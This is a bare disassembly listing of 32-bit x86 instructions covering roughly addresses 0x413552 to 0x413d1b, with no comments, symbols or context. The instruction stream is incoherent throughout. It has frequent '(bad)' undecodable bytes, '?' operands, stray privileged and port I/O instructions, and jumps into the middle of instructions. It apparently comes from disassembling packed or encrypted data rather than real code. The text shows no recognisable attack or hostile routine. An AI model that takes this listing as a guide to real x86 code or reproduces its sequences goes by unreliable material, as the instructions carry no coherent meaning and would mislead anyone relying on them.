  413552:	dec    ecx
  413553:	and    ebx,esp
  413555:	mov    ebx,0xa4927766
  41355a:	addr16 push edi
  41355c:	imul   esp,DWORD PTR [ebx+edi*4-0x7cef1712],0xf4ac2e5f
  413567:	xchg   edx,eax
  413568:	sbb    DWORD PTR [esp+ebp*4+0x3fc17493],ecx
  41356f:	int    0xe7
  413571:	sbb    DWORD PTR [edx],ebx
  413573:	push   0x31
  413575:	xchg   edx,eax
  413576:	mov    al,ds:0xab90d6a6
  41357b:	hlt    
  41357c:	pusha  
  41357d:	mov    edx,0x914a1249
  413582:	jbe    0x4135d1
  413584:	imul   ecx,DWORD PTR [edx+edi*2],0x7a
  413588:	test   edx,0x80810c39
  41358e:	dec    esi
  41358f:	call   esp
  413591:	xchg   edx,eax
  413592:	je     0x4135f1
  413594:	jo     0x4135be
  413596:	push   0xc6e083c6
  41359b:	cmp    edi,DWORD PTR [esi+0x6e]
  41359e:	pop    es
  41359f:	in     eax,dx
  4135a0:	ss inc esp
  4135a2:	pop    es
  4135a3:	add    BYTE PTR [esi+edi*8-0x34c723e7],bh
  4135aa:	mov    ebp,0x9a1f0ffb
  4135af:	pop    esp
  4135b0:	outs   dx,BYTE PTR ds:[esi]
  4135b1:	outs   dx,BYTE PTR ds:[esi]
  4135b2:	adc    DWORD PTR [ebx+0x1e],ecx
  4135b5:	shl    BYTE PTR [ecx+0x7a],cl
  4135b8:	lock mov esp,?
  4135bb:	repz dec ebp
  4135bd:	sub    BYTE PTR ds:0x27609d5a,ch
  4135c3:	ins    DWORD PTR es:[edi],dx
  4135c4:	paddq  mm1,QWORD PTR [ecx+0x46]
  4135c8:	cld    
  4135c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135ca:	sbb    ecx,DWORD PTR [ebp-0x2f]
  4135cd:	and    BYTE PTR [ebx],ah
  4135cf:	fsubr  QWORD PTR [ecx]
  4135d1:	outs   dx,BYTE PTR ds:[esi]
  4135d2:	jmp    0x413567
  4135d4:	pop    esi
  4135d5:	leave  
  4135d6:	dec    ecx
  4135d7:	jge    0x4135d6
  4135d9:	add    DWORD PTR [ebx+0x3e],esp
  4135dc:	or     eax,0xca796bf
  4135e1:	xchg   ecx,eax
  4135e2:	mov    DWORD PTR [ebx],eax
  4135e4:	sbb    eax,0xb331a100
  4135e9:	test   eax,0x51217358
  4135ee:	add    ebp,DWORD PTR [esi-0x74e8edb3]
  4135f4:	(bad)  
  4135f5:	fsub   DWORD PTR [edi-0x2a]
  4135f8:	xchg   edi,eax
  4135f9:	mov    dl,0xcb
  4135fb:	imul   BYTE PTR [ecx+0x48]
  4135fe:	xchg   esp,eax
  4135ff:	sub    DWORD PTR [eax+ecx*1+0x7706cd13],ecx
  413606:	push   ebx
  413607:	cld    
  413608:	cwde   
  413609:	shl    dh,0xfa
  41360c:	mov    al,0x9a
  41360e:	jp     0x413618
  413610:	outs   dx,BYTE PTR ds:[esi]
  413611:	xor    eax,0x778bf9a4
  413616:	(bad)  [edx]
  413618:	cmp    BYTE PTR [edx-0x510ad4a6],0x9c
  41361f:	arpl   WORD PTR [esi-0x39],ax
  413622:	sub    al,0x8a
  413624:	mov    al,ds:0x1ab29c52
  413629:	xchg   BYTE PTR [ebp+0x2415fdc7],bl
  41362f:	push   ebx
  413630:	add    ebx,esp
  413632:	xor    eax,0x6c260649
  413637:	add    esi,DWORD PTR gs:[edx-0x44]
  41363b:	fcomip st,st(4)
  41363d:	add    DWORD PTR [edx+0x1e],esp
  413640:	fsubp  st(2),st
  413642:	bound  ebx,QWORD PTR [ecx]
  413644:	js     0x413637
  413646:	mov    dl,0x4e
  413648:	gs jp  0x41364f
  41364b:	mov    cl,BYTE PTR [edi]
  41364d:	mov    cl,0x37
  41364f:	and    DWORD PTR [eax-0x6a488f51],ecx
  413655:	sbb    BYTE PTR [edi],bl
  413657:	out    dx,eax
  413658:	push   esi
  413659:	inc    ebx
  41365a:	icebp  
  41365b:	cmp    DWORD PTR [esi*4+0x4bf4cb41],esi
  413662:	mul    DWORD PTR [eax+edx*8]
  413665:	or     DWORD PTR [ecx],ecx
  413667:	xor    bh,BYTE PTR ds:0x797e9ef5
  41366d:	shl    BYTE PTR [ebx+0x39],0x70
  413671:	ja     0x4136ad
  413673:	push   ss
  413674:	xor    BYTE PTR [edi+0x80b2746],bh
  41367a:	cmp    al,0x84
  41367c:	cmp    DWORD PTR [esp+edx*8-0x296c52a4],esi
  413683:	bound  ecx,QWORD PTR [ebx+0x52]
  413686:	scas   al,BYTE PTR es:[edi]
  413687:	lds    esi,FWORD PTR [edi+0x66]
  41368a:	push   esi
  41368b:	mov    dh,BYTE PTR [edx+0x3ce9b257]
  413691:	cli    
  413692:	push   edx
  413693:	add    DWORD PTR [eax+0x16],ecx
  413696:	(bad)  
  413698:	test   DWORD PTR [ebx-0x33],eax
  41369b:	mov    al,ds:0x993b3142
  4136a0:	mov    edx,0x106cfd3a
  4136a5:	call   0x8b08:0xdade0406
  4136ac:	dec    eax
  4136ad:	adc    dh,BYTE PTR [ecx]
  4136af:	push   ebp
  4136b0:	int    0x7b
  4136b2:	xchg   DWORD PTR [edx],edx
  4136b4:	inc    esi
  4136b5:	xchg   ecx,eax
  4136b6:	add    bh,BYTE PTR [ebx]
  4136b8:	mov    BYTE PTR [ecx+0x7],dh
  4136bb:	sbb    cl,BYTE PTR [edi-0x23d413cc]
  4136c1:	cmp    esp,ebp
  4136c3:	mov    bh,0x32
  4136c5:	add    ch,0x20
  4136c8:	sbb    DWORD PTR [edx+ecx*2+0x7f],edx
  4136cc:	fwait
  4136cd:	stos   DWORD PTR es:[edi],eax
  4136ce:	push   es
  4136cf:	lods   eax,DWORD PTR ds:[esi]
  4136d0:	jle    0x413724
  4136d2:	nop
  4136d3:	pop    esi
  4136d4:	push   es
  4136d5:	mov    ecx,0x1a92d18
  4136da:	in     eax,dx
  4136db:	and    dh,ah
  4136dd:	loope  0x41370a
  4136df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e0:	xor    BYTE PTR [eax+0x7],al
  4136e3:	scas   eax,DWORD PTR es:[edi]
  4136e4:	inc    esp
  4136e5:	sti    
  4136e6:	mov    esi,ss
  4136e8:	and    BYTE PTR [ebx+0x5be42ea3],al
  4136ee:	ret    0xbb71
  4136f1:	lahf   
  4136f2:	inc    eax
  4136f3:	and    DWORD PTR [eax],edx
  4136f5:	add    BYTE PTR [ebx+0x51],bh
  4136f8:	sub    esi,DWORD PTR [ecx+0x1089c354]
  4136fe:	call   0x1550fb40
  413703:	retf   
  413704:	lahf   
  413705:	imul   cl
  413707:	sbb    ebx,ecx
  413709:	cmp    DWORD PTR [edi],esi
  41370b:	pushf  
  41370c:	stos   DWORD PTR es:[edi],eax
  41370d:	mov    ah,0x44
  41370f:	sub    al,0x9b
  413711:	aaa    
  413712:	cmp    eax,0x846f4a69
  413717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413718:	aas    
  413719:	daa    
  41371a:	xchg   esp,eax
  41371b:	stos   DWORD PTR es:[edi],eax
  41371c:	shl    bh,1
  41371e:	mov    ebx,DWORD PTR [esi]
  413720:	xlat   BYTE PTR ds:[ebx]
  413721:	ja     0x4136ef
  413723:	shr    BYTE PTR [esi+0x588f8b62],0x3a
  41372a:	add    eax,0xa2538c47
  41372f:	adc    ebx,DWORD PTR [esi-0x6fd69cb6]
  413735:	cmp    esp,DWORD PTR [edx]
  413737:	inc    edx
  413738:	jp     0x4137a6
  41373a:	mov    edi,DWORD PTR [edx-0x54]
  41373d:	mov    ebp,0xd3a774fc
  413742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413743:	jmp    0x41371e
  413745:	mov    ds:0x88692a7d,al
  41374a:	imul   ecx,DWORD PTR [ebx],0x19e78d57
  413750:	cmp    DWORD PTR [edx],edi
  413752:	daa    
  413753:	out    0x4e,al
  413755:	popf   
  413756:	or     al,cl
  413758:	loopne 0x413752
  41375a:	test   BYTE PTR ds:0x8aed93c4,ah
  413760:	ins    DWORD PTR es:[edi],dx
  413761:	xchg   edx,eax
  413762:	or     eax,0x184f08e7
  413767:	sar    BYTE PTR gs:0x994c9dc9,1
  41376e:	and    dl,BYTE PTR [ebp+ebp*4-0x6d2c0a18]
  413775:	cwde   
  413776:	mov    bl,0x96
  413778:	cwde   
  413779:	jecxz  0x4137a6
  41377b:	(bad)  
  41377c:	sub    DWORD PTR [ecx+eax*8],edi
  41377f:	out    dx,al
  413780:	inc    ebx
  413781:	shl    DWORD PTR [ecx],cl
  413783:	sbb    esi,DWORD PTR [edx-0x6f]
  413786:	fs stc 
  413788:	mov    al,0xe7
  41378a:	fistp  DWORD PTR [edi-0x4b25a791]
  413790:	mov    gs,WORD PTR [ecx-0x9891b36]
  413796:	pop    ss
  413797:	inc    ebx
  413798:	loope  0x4137f4
  41379a:	xchg   ecx,eax
  41379b:	repnz popa 
  41379d:	mov    ds:0xce5f1192,al
  4137a2:	sbb    DWORD PTR [esi-0x3b],ebp
  4137a5:	int3   
  4137a6:	add    edi,DWORD PTR [esi]
  4137a8:	cmp    DWORD PTR [eax+0x1c],ecx
  4137ab:	dec    esp
  4137ac:	aas    
  4137ad:	fs cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4137b0:	retw   
  4137b2:	cmp    eax,0x6408131b
  4137b7:	inc    ebx
  4137b8:	and    BYTE PTR [ebx-0xa53664f],bl
  4137be:	mov    esi,0xda4f9f84
  4137c3:	sub    eax,0x27063ec6
  4137c8:	or     al,0x4a
  4137ca:	out    dx,al
  4137cb:	je     0x41383f
  4137cd:	cmc    
  4137ce:	and    edi,DWORD PTR [ecx-0x66]
  4137d1:	hlt    
  4137d2:	jl     0x4137f9
  4137d4:	mov    WORD PTR [ebx-0x3a],fs
  4137d7:	(bad)  
  4137d8:	leave  
  4137d9:	iret   
  4137da:	test   BYTE PTR [eax+0x7b95a1b7],0xfa
  4137e1:	ret    0xd62b
  4137e4:	and    eax,0x8a5f5295
  4137e9:	imul   esp,DWORD PTR [eax],0xfefa8805
  4137ef:	mov    ebp,0x6ba7ea7a
  4137f4:	sahf   
  4137f5:	(bad)  
  4137f6:	out    0x6e,eax
  4137f8:	xchg   ebx,eax
  4137f9:	sbb    BYTE PTR [esi-0x5e],bl
  4137fc:	and    ah,BYTE PTR [eax+0x7fb83e2c]
  413802:	sbb    edx,edi
  413804:	xchg   ebx,eax
  413805:	popf   
  413806:	mov    ds:0x2aa2c442,al
  41380b:	fwait
  41380c:	pop    eax
  41380d:	das    
  41380e:	and    eax,0x89da8348
  413813:	and    bh,BYTE PTR [ecx]
  413815:	iret   
  413816:	xlat   BYTE PTR ds:[ebx]
  413817:	xchg   ebp,eax
  413818:	int    0x1a
  41381a:	and    ah,cl
  41381c:	nop
  41381d:	shl    DWORD PTR [ebp-0xce1ee60],cl
  413823:	xchg   ebx,eax
  413824:	mov    esp,0xdecdc2cd
  413829:	daa    
  41382a:	loop   0x41381f
  41382c:	cmp    eax,0xb548728a
  413831:	and    BYTE PTR [esi+eiz*2+0x5f],cl
  413835:	aas    
  413836:	add    DWORD PTR [esi-0x1a],edi
  413839:	outs   dx,BYTE PTR ds:[esi]
  41383a:	push   ds
  41383b:	nop
  41383c:	ins    BYTE PTR es:[edi],dx
  41383d:	sar    DWORD PTR [eax-0x7f],0x50
  413841:	sub    DWORD PTR [esp+edx*2+0x74073a7a],edi
  413848:	add    eax,0x59d7abeb
  41384d:	sub    al,0x93
  41384f:	retf   
  413850:	aad    0xc6
  413852:	jno    0x4138b8
  413854:	mov    cl,al
  413856:	sub    dl,BYTE PTR [ecx]
  413858:	mov    dl,0x13
  41385a:	sub    eax,0x9c9fda83
  41385f:	mov    eax,0xa1cbc620
  413864:	cmp    al,cl
  413866:	ficom  WORD PTR [edi-0x71]
  413869:	and    esp,DWORD PTR [ebx]
  41386b:	test   eax,0xd307ffc6
  413870:	mov    ecx,0x366314d0
  413875:	loop   0x41385c
  413877:	sbb    BYTE PTR [edx-0x2a],ch
  41387a:	adc    al,bl
  41387c:	ret    0xbd4a
  41387f:	mov    edi,0x98ca3411
  413884:	cs cld 
  413886:	(bad)  
  413887:	bound  ebp,QWORD PTR [edx*1+0x1cf6f9cc]
  41388e:	cmp    bl,al
  413890:	cmc    
  413891:	push   ss
  413892:	sbb    BYTE PTR [edx],al
  413894:	idiv   edi
  413896:	stos   BYTE PTR es:[edi],al
  413897:	adc    esp,DWORD PTR [eax]
  413899:	mov    esi,cs
  41389b:	cmp    BYTE PTR [ebx-0x38],dh
  41389e:	dec    ebp
  41389f:	fwait
  4138a0:	pop    ss
  4138a1:	arpl   WORD PTR [ebx+0x22],bx
  4138a4:	pop    ds
  4138a5:	push   0x5
  4138a7:	outs   dx,DWORD PTR ds:[esi]
  4138a8:	add    ecx,edi
  4138aa:	push   esp
  4138ab:	std    
  4138ac:	push   edi
  4138ad:	cli    
  4138ae:	mov    cl,0x4f
  4138b0:	xor    DWORD PTR [eax+ebx*1],0xffffff9c
  4138b4:	and    esi,DWORD PTR [esp+edx*2]
  4138b7:	push   ebx
  4138b8:	xchg   BYTE PTR [esi-0x1d],bh
  4138bb:	sbb    DWORD PTR [edx],eax
  4138bd:	adc    BYTE PTR [ebx+0x78618407],cl
  4138c3:	xchg   ecx,eax
  4138c4:	and    al,0x97
  4138c6:	retf   
  4138c7:	push   es
  4138c8:	jl     0x41385f
  4138ca:	adc    BYTE PTR [edx+eax*1],bh
  4138cd:	jmp    DWORD PTR [ecx]
  4138cf:	cwde   
  4138d0:	add    eax,0xa65efd65
  4138d5:	mov    ds:0xec43e13d,eax
  4138da:	aad    0xf5
  4138dc:	cmp    DWORD PTR [ebp+eax*2-0x42e7b395],ecx
  4138e3:	push   ebp
  4138e4:	jns    0x41388a
  4138e6:	adc    bl,BYTE PTR [ecx+0x5a8cc1c2]
  4138ec:	in     eax,0xbc
  4138ee:	mov    cl,BYTE PTR [eax-0x44e2849b]
  4138f4:	cmc    
  4138f5:	jmp    0xd668:0xd925cc7b
  4138fc:	in     eax,0xb4
  4138fe:	ret    
  4138ff:	retf   
  413900:	cmp    ecx,ebx
  413902:	(bad)
  413906:	mov    esp,0x420a6d80
  41390b:	aam    0xc2
  41390d:	sti    
  41390e:	outs   dx,DWORD PTR ds:[esi]
  41390f:	call   0x7549edc1
  413914:	mov    ah,0xae
  413916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413917:	aaa    
  413918:	mov    al,0x9e
  41391a:	sub    eax,0x438fac32
  41391f:	pop    es
  413920:	mov    esp,0x81dce18
  413925:	mov    al,0x8e
  413927:	pushf  
  413928:	push   ds
  413929:	jecxz  0x413904
  41392b:	push   ss
  41392c:	add    esp,DWORD PTR [ebp-0x40e38d86]
  413932:	icebp  
  413933:	sets   BYTE PTR [ebx-0x23c64d8]
  41393a:	and    BYTE PTR [edx],dh
  41393c:	or     dh,ch
  41393e:	inc    eax
  41393f:	sbb    DWORD PTR [esi-0x3d53d18c],esp
  413945:	dec    ebp
  413946:	jbe    0x413993
  413948:	ret    0x7340
  41394b:	or     BYTE PTR [ecx+0x2c048a3f],0x4d
  413952:	sbb    DWORD PTR [edi+0x3e04d3e6],edi
  413958:	je     0x4139b7
  41395a:	pop    esi
  41395b:	cmc    
  41395c:	inc    ebp
  41395d:	retf   
  41395e:	push   eax
  41395f:	mov    al,ds:0xf86a3a55
  413964:	mov    al,ds:0x8080bffb
  413969:	push   edx
  41396a:	fcom   st(2)
  41396c:	fbstp  TBYTE PTR [edi]
  41396e:	push   esi
  41396f:	push   edi
  413970:	ret    
  413971:	jge    0x413904
  413973:	sub    BYTE PTR [ebx-0x45],cl
  413976:	xor    eax,0xbe174d15
  41397b:	loope  0x41395c
  41397d:	cmp    BYTE PTR [ebx-0x28ffc13b],cl
  413983:	or     dh,BYTE PTR [ebx]
  413985:	and    DWORD PTR [edi+edi*4],eax
  413988:	fstp   TBYTE PTR [edx]
  41398a:	aaa    
  41398b:	loopne 0x41399d
  41398d:	call   0x966a:0xa7e7c22a
  413994:	xor    ah,bl
  413996:	sub    al,BYTE PTR [ecx+ebx*2]
  413999:	sbb    edi,ebp
  41399b:	out    0x5b,eax
  41399d:	jae    0x4139ae
  41399f:	mov    bh,0x45
  4139a1:	hlt    
  4139a2:	aad    0xf2
  4139a4:	xchg   bh,ch
  4139a6:	popa   
  4139a7:	jmp    0x4139b2
  4139a9:	xchg   ecx,eax
  4139aa:	jge    0x4139ad
  4139ac:	retf   
  4139ad:	push   esp
  4139ae:	xor    dh,dl
  4139b0:	mov    bl,0xbe
  4139b2:	fisttp QWORD PTR [edi+0x64]
  4139b5:	and    edi,DWORD PTR [ecx-0x20]
  4139b8:	repz jl 0x41398e
  4139bb:	xor    eax,0x2e325b62
  4139c0:	jmp    0x413997
  4139c2:	(bad)  
  4139c3:	xor    DWORD PTR [eax+ecx*1+0x56d62c56],edx
  4139ca:	pushf  
  4139cb:	mov    ?,WORD PTR [edx+0x5a]
  4139ce:	xchg   ebx,eax
  4139cf:	outs   dx,DWORD PTR ds:[esi]
  4139d0:	push   ds
  4139d1:	mov    WORD PTR [eax],fs
  4139d3:	inc    ebx
  4139d4:	add    al,BYTE PTR [ebp+0x4]
  4139d7:	jo     0x4139aa
  4139d9:	xchg   ecx,eax
  4139da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139db:	push   0x12c174fd
  4139e0:	xor    eax,0xd6ac71ed
  4139e5:	sti    
  4139e6:	pop    ebx
  4139e7:	xchg   esp,eax
  4139e8:	sub    esp,ebp
  4139ea:	clc    
  4139eb:	stos   DWORD PTR es:[edi],eax
  4139ec:	jle    0x413985
  4139ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139ef:	mov    edi,0xfbefb8e2
  4139f4:	or     DWORD PTR ds:0xa8c30793,edi
  4139fa:	loopne 0x413a41
  4139fc:	retf   0x36fc
  4139ff:	pop    edi
  413a00:	push   ss
  413a01:	xor    al,0x11
  413a03:	int3   
  413a04:	jecxz  0x4139fb
  413a06:	add    BYTE PTR [ecx],ch
  413a08:	test   eax,0x9066b8cd
  413a0d:	sub    BYTE PTR [ecx+0x3e49b06a],al
  413a13:	xchg   ecx,eax
  413a14:	cmp    eax,0xa31e4e35
  413a19:	add    eax,DWORD PTR [esi+0x76a9e06b]
  413a1f:	jbe    0x413a71
  413a21:	retf   
  413a22:	out    0xc4,al
  413a24:	mov    edx,0xae958646
  413a29:	retf   
  413a2a:	cmc    
  413a2b:	pop    ebp
  413a2c:	leave  
  413a2d:	mov    ds:0x93b0ca56,al
  413a32:	aad    0x9
  413a34:	inc    ecx
  413a35:	mov    edx,0x6a5877d9
  413a3a:	xor    DWORD PTR [eax+0x778fc2c7],eax
  413a40:	add    al,0x0
  413a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a44:	mov    ds:0x66a11478,al
  413a49:	jnp    0x4139fb
  413a4b:	adc    bl,BYTE PTR [esi+0x7bfa0c84]
  413a51:	rcl    BYTE PTR [esi-0x56a82b11],1
  413a57:	out    dx,al
  413a58:	rcr    BYTE PTR [ebx+0x24e32f05],cl
  413a5e:	or     esp,ebx
  413a60:	pop    ds
  413a61:	pop    ds
  413a62:	int3   
  413a63:	aaa    
  413a64:	xor    esp,DWORD PTR [ebp+eax*2-0x72341f0f]
  413a6b:	outs   dx,BYTE PTR ds:[esi]
  413a6c:	add    ebx,DWORD PTR [ebx+edi*1+0x64]
  413a70:	test   eax,0x1b54ce1c
  413a75:	enter  0xde8a,0x82
  413a79:	adc    esi,DWORD PTR [edi-0x555e22e]
  413a7f:	iret   
  413a80:	or     esp,DWORD PTR [ebp+ecx*2-0x6a]
  413a84:	mov    ch,0xea
  413a86:	inc    esp
  413a87:	mov    bh,0xea
  413a89:	(bad)  
  413a8a:	cmp    edi,DWORD PTR [edi+0x34]
  413a8d:	inc    eax
  413a8e:	jle    0x413aa9
  413a90:	das    
  413a91:	xchg   esp,eax
  413a92:	(bad)  
  413a93:	pop    ebx
  413a94:	cmp    bl,bh
  413a96:	(bad)  
  413a97:	aaa    
  413a98:	retf   0xc57
  413a9b:	xor    eax,0xc3e7cfd8
  413aa0:	sbb    dh,al
  413aa2:	int3   
  413aa3:	jo     0x413a4b
  413aa5:	iret   
  413aa6:	sbb    esi,0xfffffff3
  413aa9:	out    0x72,al
  413aab:	xor    BYTE PTR [edi-0x47],al
  413aae:	bound  ebx,QWORD PTR [esp+ebx*2+0x406e42f8]
  413ab5:	int    0x23
  413ab7:	stos   BYTE PTR es:[edi],al
  413ab8:	mov    al,ds:0xa02e7155
  413abd:	dec    eax
  413abe:	xlat   BYTE PTR ds:[ebx]
  413abf:	jno    0x413b04
  413ac1:	inc    esp
  413ac2:	ds test edx,ebp
  413ac5:	fcmovb st,st(2)
  413ac7:	call   0xea354b6e
  413acc:	xlat   BYTE PTR ds:[ebx]
  413acd:	out    dx,eax
  413ace:	sbb    bl,BYTE PTR [ecx+0x455b60b3]
  413ad4:	repnz cmp bh,cl
  413ad7:	add    eax,0x172356ac
  413adc:	and    BYTE PTR [eax],bh
  413ade:	(bad)  
  413adf:	fidivr DWORD PTR [eax-0x10]
  413ae2:	cmc    
  413ae3:	push   ebp
  413ae5:	sub    al,0xba
  413ae7:	cld    
  413ae8:	and    dh,BYTE PTR [eax+0x2e]
  413aeb:	inc    esi
  413aec:	mov    ch,0x24
  413aee:	je     0x413aa5
  413af0:	pushf  
  413af1:	retf   
  413af2:	adc    cl,bh
  413af4:	jb     0x413af3
  413af6:	out    dx,al
  413af7:	loop   0x413a86
  413af9:	dec    eax
  413afa:	or     cl,BYTE PTR [edx-0x20]
  413afd:	pop    edx
  413afe:	sub    BYTE PTR [edi-0x1706fe07],0x79
  413b05:	pop    ebp
  413b06:	ret    0x7ebd
  413b09:	add    al,BYTE PTR [eax+eax*2-0x5910ff22]
  413b10:	mov    esp,0x41c624e2
  413b15:	mov    cl,0xb0
  413b17:	add    esp,DWORD PTR [ecx]
  413b19:	ret    0x3e72
  413b1c:	jae    0x413acc
  413b1e:	mov    esi,0xb8aa8ee8
  413b23:	(bad)  [edi+0x63]
  413b26:	cmp    ah,0x4a
  413b29:	lock ss call 0xe9d69369
  413b30:	mov    ah,0xc4
  413b32:	sub    edx,DWORD PTR [edi+ebp*8-0x2d15025d]
  413b39:	xchg   ebx,ebx
  413b3b:	aaa    
  413b3c:	cli    
  413b3d:	cmp    bh,BYTE PTR [ebx+0x56ca6b3e]
  413b43:	adc    eax,0x202613d4
  413b48:	loop   0x413aee
  413b4a:	enter  0x58e7,0x68
  413b4e:	int    0x43
  413b50:	inc    esp
  413b51:	push   eax
  413b52:	test   edx,ebx
  413b54:	pop    es
  413b55:	jns    0x413bb9
  413b57:	cmp    cl,bl
  413b59:	pop    ds
  413b5a:	data16 jmp 0x413b9b
  413b5d:	adc    DWORD PTR ss:[edx],ebp
  413b60:	loope  0x413bdf
  413b62:	adc    al,0x38
  413b64:	call   0xac1a:0xbe697303
  413b6b:	mov    esi,0x3dae632d
  413b70:	xchg   al,bh
  413b72:	xor    eax,0x5eaea00b
  413b77:	or     eax,0x66504e79
  413b7c:	data16 aaa 
  413b7e:	adc    bh,ah
  413b80:	pop    edi
  413b81:	push   cs
  413b82:	rcl    DWORD PTR [ebx-0x2527980e],0x63
  413b89:	mov    DWORD PTR [ecx+0x72],ebx
  413b8c:	xor    DWORD PTR [esi+0x154c3c6b],edx
  413b92:	les    ebp,FWORD PTR [edx+0x4b]
  413b95:	add    al,0xf6
  413b97:	adc    edx,DWORD PTR [edx-0x76]
  413b9a:	xchg   al,bl
  413b9c:	xchg   ecx,eax
  413b9d:	jbe    0x413bfe
  413b9f:	or     BYTE PTR [ecx+edi*1+0x58435d0],0x5e
  413ba7:	enter  0x382a,0x5c
  413bab:	repnz push esp
  413bad:	pop    esp
  413bae:	xor    al,0xe
  413bb0:	sub    DWORD PTR [eax],esp
  413bb2:	outs   dx,BYTE PTR ds:[esi]
  413bb3:	pop    ecx
  413bb4:	sbb    dh,BYTE PTR [ebp-0x26]
  413bb7:	(bad)  
  413bb8:	aad    0xfd
  413bba:	mov    dh,0xc3
  413bbc:	cmp    ebp,edi
  413bbe:	sub    al,0xa5
  413bc0:	and    DWORD PTR [eax-0x1e56e31b],edi
  413bc6:	mov    ecx,0x2d7a3c4
  413bcb:	retf   0x9cc2
  413bce:	js     0x413b65
  413bd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bd1:	out    dx,eax
  413bd2:	imul   DWORD PTR [ecx-0x5b5d80d7]
  413bd8:	jo     0x413c03
  413bda:	inc    esp
  413bdb:	(bad)  [edi+0x7661ddaf]
  413be1:	cmp    ebx,ebx
  413be3:	aam    0xd5
  413be5:	add    BYTE PTR [esi+edi*2],cl
  413be8:	shl    BYTE PTR [ebx+ecx*1],1
  413beb:	imul   edx,DWORD PTR [ebx+0x5d8f984],0xffffffc5
  413bf2:	dec    ebp
  413bf3:	and    edx,eax
  413bf5:	ins    BYTE PTR es:[edi],dx
  413bf6:	sar    DWORD PTR [ecx+0x523ed524],1
  413bfc:	or     DWORD PTR [edx-0x12],esi
  413bff:	inc    ecx
  413c00:	inc    edi
  413c01:	pop    edx
  413c03:	add    DWORD PTR [ebx-0x37eff5e8],ecx
  413c09:	(bad)  
  413c0a:	pop    ebx
  413c0b:	and    al,0x3b
  413c0d:	and    BYTE PTR [edi-0x1b],bl
  413c10:	adc    BYTE PTR [ebx+0x37327331],0xab
  413c17:	rol    BYTE PTR [ebx],1
  413c19:	rcr    DWORD PTR [ebp+0x31882a13],0x22
  413c20:	bound  esp,QWORD PTR [eax]
  413c22:	jg     0x413c3a
  413c24:	xchg   ebp,eax
  413c25:	push   ecx
  413c26:	int    0xe2
  413c28:	jo     0x413c8b
  413c2a:	cmp    dl,BYTE PTR [ebx+0x60bf1b8]
  413c30:	jbe    0x413bea
  413c32:	sbb    eax,0x8551ea23
  413c37:	dec    ebp
  413c38:	xchg   esp,eax
  413c39:	mov    BYTE PTR [ecx+edx*2],ch
  413c3c:	mov    dh,0x8f
  413c3e:	sbb    al,0x92
  413c40:	dec    edx
  413c41:	push   ebx
  413c42:	ror    DWORD PTR [edi+0x5a14f319],1
  413c48:	outs   dx,BYTE PTR ds:[esi]
  413c49:	test   al,0xbe
  413c4b:	dec    ebx
  413c4c:	dec    ecx
  413c4d:	adc    ebx,0xfffffff4
  413c50:	scas   eax,DWORD PTR es:[edi]
  413c51:	jmp    0x6e27f0b8
  413c56:	xchg   esp,eax
  413c57:	(bad)  
  413c58:	dec    ebx
  413c59:	js     0x413bdc
  413c5b:	push   cs
  413c5c:	das    
  413c5d:	std    
  413c5e:	dec    BYTE PTR [eax]
  413c60:	dec    esi
  413c61:	shr    DWORD PTR [ebp-0x46c46fc1],0xa0
  413c68:	scas   eax,DWORD PTR es:[edi]
  413c69:	sbb    ch,bl
  413c6b:	or     al,0xee
  413c6d:	nop
  413c6e:	add    BYTE PTR [ebp+0x1d0637ad],bl
  413c74:	inc    edx
  413c75:	or     ch,dh
  413c77:	pop    edi
  413c78:	bnd jmp 0x413c60
  413c7b:	fisub  WORD PTR [esi+0x4b8a7a22]
  413c81:	gs push edx
  413c83:	test   eax,0xa943213a
  413c88:	xor    bl,BYTE PTR [edi]
  413c8a:	aas    
  413c8b:	push   0x6434b3b6
  413c90:	push   ds
  413c91:	hlt    
  413c92:	test   esi,ecx
  413c94:	add    eax,0x51907585
  413c99:	cmc    
  413c9a:	retf   
  413c9b:	or     eax,0x2059b038
  413ca0:	sub    dh,BYTE PTR [edi+0x19]
  413ca3:	arpl   WORD PTR [ebp-0x44],sp
  413ca6:	ja     0x413d1d
  413ca8:	hlt    
  413ca9:	outs   dx,BYTE PTR ds:[esi]
  413caa:	inc    ebx
  413cab:	test   al,0xa5
  413cad:	pop    ebx
  413cae:	cmp    dl,BYTE PTR [esi+esi*4+0x67]
  413cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cb3:	stos   DWORD PTR es:[edi],eax
  413cb4:	cmp    BYTE PTR [edx+0x46ac989e],dh
  413cba:	les    esi,FWORD PTR [eax+0x47]
  413cbd:	cmp    BYTE PTR [esi+eax*8],0x88
  413cc1:	jnp    0x413c7d
  413cc3:	loop   0x413c8a
  413cc5:	jl     0x413d34
  413cc7:	pop    esp
  413cc8:	(bad)  
  413cc9:	rcl    edx,cl
  413ccb:	(bad)  [ecx+0xa]
  413cce:	aad    0x4a
  413cd0:	xchg   BYTE PTR [ecx+0x1576d245],ch
  413cd6:	dec    edi
  413cd7:	retf   
  413cd8:	ja     0x413cf6
  413cda:	jo     0x413c76
  413cdc:	fadd   QWORD PTR [ebp-0x19805c00]
  413ce2:	add    DWORD PTR [esi],edx
  413ce4:	mov    al,0xfa
  413ce6:	cmp    cl,BYTE PTR [ebp-0x3bdc78c7]
  413cec:	iret   
  413ced:	(bad)  
  413cee:	jnp    0x413d22
  413cf0:	mov    edi,esp
  413cf2:	(bad)
  413cf5:	imul   esi,DWORD PTR [edi],0x4
  413cf8:	mov    ah,0x4d
  413cfa:	cmp    esi,esp
  413cfc:	jb     0x413d16
  413cfe:	out    0xec,eax
  413d00:	mov    WORD PTR ds:0x82695b5e,gs
  413d06:	mov    ebx,0x89b5da0
  413d0b:	sub    BYTE PTR [edi],dl
  413d0d:	stos   DWORD PTR es:[edi],eax
  413d0e:	int3   
  413d0f:	cmc    
  413d10:	call   0x6a725052
  413d15:	dec    ebx
  413d16:	arpl   WORD PTR [edi],ax
  413d18:	fbld   TBYTE PTR [edi]
  413d1a:	pusha  
  413d1b:	jecxz  0x413cd4
